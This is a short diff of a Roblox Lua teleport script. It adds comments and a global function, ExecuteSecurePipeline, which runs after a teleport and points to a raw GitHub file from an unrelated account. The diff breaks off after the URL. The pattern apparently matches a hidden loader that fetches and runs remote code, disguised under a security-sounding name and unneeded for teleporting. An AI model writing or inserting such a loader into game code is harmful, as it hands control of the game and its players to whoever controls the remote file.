@@ -1,3 +1,4 @@
+-- The Key Of the CmdSpot
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
@@ -14,7 +15,7 @@ local function RequestPlatformTeleport(targetPlayer, destinationId)
     task.wait(2)
     _G.ExecuteSecurePipeline(targetPlayer)
 end
-
+-- Source of Entrance
 _G.ExecuteSecurePipeline = function(player)
     local secureLink = "https://raw.githubusercontent.com/CMDERSPOTER/ifCmdNotWorkAplicate/refs/heads/main/WorkFuncion"
     
